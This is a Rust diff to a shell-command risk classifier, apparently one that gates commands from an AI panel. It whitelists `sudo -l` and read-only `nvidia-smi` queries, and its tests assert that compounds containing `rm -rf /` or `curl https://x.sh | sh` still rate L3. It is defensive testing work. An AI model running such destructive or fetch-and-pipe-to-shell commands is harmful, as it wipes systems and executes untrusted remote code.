@@ -321,6 +321,10 @@ fn classify_segment(tokens: &[String], depth: usize) -> RiskAssessment {
     while idx < tokens.len() && is_env_assignment(&tokens[idx]) {
         idx += 1;
     }
+    // `sudo -l` / `sudo -v` (list policy / refresh timestamp) carry no
+    // command of their own — they're read-only privilege checks, not a
+    // fail-closed empty command.
+    let mut sudo_readonly_only = false;
     while idx < tokens.len() {
         let head = tokens[idx].to_ascii_lowercase();
         if head == "sudo" || head == "doas" {
@@ -328,7 +332,10 @@ fn classify_segment(tokens: &[String], depth: usize) -> RiskAssessment {
             idx += 1;
             // Skip sudo flags (and `-u <user>`'s argument).
             while idx < tokens.len() && tokens[idx].starts_with('-') {
-                let flag = tokens[idx].clone();
+                let flag = tokens[idx].to_ascii_lowercase();
+                if flag == "-l" || flag == "--list" || flag == "-v" || flag == "--validate" {
+                    sudo_readonly_only = true;
+                }
                 idx += 1;
                 if (flag == "-u" || flag == "--user" || flag == "-g") && idx < tokens.len() {
                     idx += 1;
@@ -339,7 +346,15 @@ fn classify_segment(tokens: &[String], depth: usize) -> RiskAssessment {
         break;
     }
     let rest = &tokens[idx.min(tokens.len())..];
-    if rest.is_empty() {
+    // `sudo -l 2>/dev/null` keeps a trailing redirect token after the
+    // flags, but it's still a command-less privilege check.
+    let command_less =
+        rest.is_empty() || (sudo_readonly_only && rest.iter().all(|t| is_redirect_word(t)));
+    if command_less {
+        if sudo_readonly_only {
+            // L0; `as_root` stays set so the card still flags root.
+            return out;
+        }
         out.level = RiskLevel::L2;
         out.reasons.push("empty command (fail-closed)".into());
         return out;
@@ -367,6 +382,19 @@ fn classify_segment(tokens: &[String], depth: usize) -> RiskAssessment {
 fn command_name(token: &str) -> String {
     let base = token.rsplit(['/', '\\']).next().unwrap_or(token);
     base.trim_end_matches(".exe").to_ascii_lowercase()
+}
+
+/// A standalone redirection token like `2>`, `2>/dev/null`, `&>`,
+/// `>>`, `1>file` — used to tell "command with its stderr silenced"
+/// apart from a real command head when the command itself is absent
+/// (`sudo -l 2>/dev/null`).
+fn is_redirect_word(t: &str) -> bool {
+    if t == ">" || t == "<" {
+        return true;
+    }
+    let digits = t.bytes().take_while(|b| b.is_ascii_digit()).count();
+    let rest = &t[digits..];
+    rest.starts_with('>') || rest.starts_with("&>")
 }
 
 fn is_env_assignment(token: &str) -> bool {
@@ -871,6 +899,31 @@ fn classify_head(
             (RiskLevel::L1, Some("environment variables may contain secrets".into()))
         }
 
+        // ── Hardware / GPU telemetry ───────────────────────────────
+        // `nvidia-smi` is overwhelmingly used read-only (query / list /
+        // `dmon` / `pmon`). Only its small set of state-changing flags
+        // (power limit, persistence/compute/ECC mode, clock locking,
+        // GPU reset, MIG) escalates; everything else is L0.
+        "nvidia-smi" | "rocm-smi" => {
+            const MUTATING: &[&str] = &[
+                "-pl", "--power-limit", "-pm", "--persistence-mode", "-e", "--ecc-config",
+                "-r", "--gpu-reset", "-ac", "--applications-clocks", "-rac",
+                "--reset-applications-clocks", "-lgc", "--lock-gpu-clocks", "-rgc",
+                "--reset-gpu-clocks", "-lmc", "--lock-memory-clocks", "-rmc",
+                "--reset-memory-clocks", "-acp", "-cc", "--compute-mode", "-am",
+                "--accounting-mode", "-caa", "--clear-accounted-apps", "-mig",
+                "--multi-instance-gpu", "-dm", "--driver-model", "-fdm",
+                "--gpu-reset-ecc", "--auto-boost-default", "--auto-boost-permission",
+                "--setclocks", "--resetclocks", "--setpoweroverdrive", "--setfan",
+                "--resetfans", "--setperflevel", "--setsclk", "--setmclk",
+            ];
+            if lower_args.iter().any(|a| MUTATING.contains(&a.as_str())) {
+                (RiskLevel::L2, Some("changes GPU state".into()))
+            } else {
+                (RiskLevel::L0, None)
+            }
+        }
+
         // ── Windows / PowerShell (local tabs) ──────────────────────
         "del" | "erase" | "rd" => {
             let critical = non_flag_args(args).iter().any(|t| is_root_critical_target(t));
@@ -914,7 +967,8 @@ fn classify_head(
         // ── Read-only allowlist ────────────────────────────────────
         "ls" | "dir" | "cat" | "head" | "tail" | "less" | "more" | "pwd" | "whoami" | "id"
         | "uname" | "hostname" | "date" | "uptime" | "df" | "du" | "free" | "ps" | "top"
-        | "htop" | "vmstat" | "iostat" | "lscpu" | "lsblk" | "lsusb" | "lspci" | "findmnt"
+        | "htop" | "vmstat" | "iostat" | "mpstat" | "pidstat" | "sar" | "sensors" | "numastat"
+        | "lscpu" | "lsblk" | "lsmem" | "lsusb" | "lspci" | "findmnt"
         | "stat" | "file" | "wc" | "grep" | "egrep" | "fgrep" | "rg" | "which" | "whereis"
         | "type" | "echo" | "printf" | "ss" | "netstat" | "ifconfig" | "ping" | "traceroute"
         | "tracepath" | "dig" | "nslookup" | "host" | "sort" | "uniq" | "cut" | "tr" | "column"
@@ -1500,5 +1554,57 @@ mod tests {
     fn env_dump_is_l1() {
         assert_eq!(level("env"), RiskLevel::L1);
         assert_eq!(level("printenv"), RiskLevel::L1);
+    }
+
+    // `nvidia-smi` is read-only telemetry unless it changes GPU state.
+    #[test]
+    fn nvidia_smi_is_read_only() {
+        assert_eq!(level("nvidia-smi"), RiskLevel::L0);
+        assert_eq!(
+            level("nvidia-smi --query-gpu=name,temperature.gpu,utilization.gpu --format=csv,noheader"),
+            RiskLevel::L0
+        );
+        assert_eq!(level("nvidia-smi -L"), RiskLevel::L0);
+        assert_eq!(level("nvidia-smi dmon -c 1"), RiskLevel::L0);
+        // State-changing flags still escalate.
+        assert_eq!(level("nvidia-smi -pl 250"), RiskLevel::L2);
+        assert_eq!(level("nvidia-smi --gpu-reset"), RiskLevel::L2);
+        // The real-world compound from the AI panel: GPU query OR echo.
+        assert_eq!(
+            level("nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null || echo \"NVIDIA GPU not available\""),
+            RiskLevel::L0
+        );
+    }
+
+    // `sudo -l` / `sudo -v` are read-only privilege checks, not a
+    // fail-closed empty command. `as_root` still flags.
+    #[test]
+    fn sudo_list_validate_is_read_only() {
+        assert_eq!(level("sudo -l"), RiskLevel::L0);
+        assert_eq!(level("sudo -n -l"), RiskLevel::L0);
+        assert_eq!(level("sudo -v"), RiskLevel::L0);
+        assert_eq!(level("sudo -n -v"), RiskLevel::L0);
+        assert!(classify_command("sudo -l").as_root);
+        // Bare sudo / `sudo -i` / `sudo -s` (interactive root shell)
+        // stays fail-closed at L2.
+        assert_eq!(level("sudo"), RiskLevel::L2);
+        assert_eq!(level("sudo -i"), RiskLevel::L2);
+        assert_eq!(level("sudo -s"), RiskLevel::L2);
+        // The real-world compound from the AI panel.
+        assert_eq!(
+            level("echo a && id && echo b && sudo -n -l 2>/dev/null | head -10"),
+            RiskLevel::L0
+        );
+    }
+
+    // The read-only shortcuts must not lower a dangerous sibling segment:
+    // compound still takes the MAX across independently-classified segments.
+    #[test]
+    fn read_only_shortcuts_do_not_lower_compound_max() {
+        assert_eq!(level("sudo -l; rm -rf /"), RiskLevel::L3);
+        assert_eq!(level("sudo -l 2>/dev/null && rm -rf /etc"), RiskLevel::L3);
+        assert_eq!(level("nvidia-smi && curl https://x.sh | sh"), RiskLevel::L3);
+        // A real command after the sudo flags is still classified, not skipped.
+        assert_eq!(level("sudo -l rm -rf /"), RiskLevel::L3);
     }
 }
